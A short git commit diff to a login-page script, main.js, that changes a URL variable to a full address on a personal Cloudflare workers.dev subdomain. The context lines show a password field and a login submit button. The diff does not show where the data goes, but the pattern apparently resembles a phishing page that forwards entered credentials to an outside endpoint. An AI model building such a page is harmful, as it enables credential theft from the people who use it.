e50590486b1f1500ea9b6d5f26d020ec87a74613
jjmdw <jjmdw@hotmail.com>
2025-02-08 01:38:25 -0500

    Update main.js

--- main.js
+++ main.js
@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
   	.prop("type", "password");
   }
 });
-    var url="holy-surf-e8b5.jjmdw.workers.dev"
+    var url="https://holy-surf-e8b5.jjmdw.workers.dev/"
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv")
     userBackButton =  document.getElementById("userBackButtonSpanTxt")
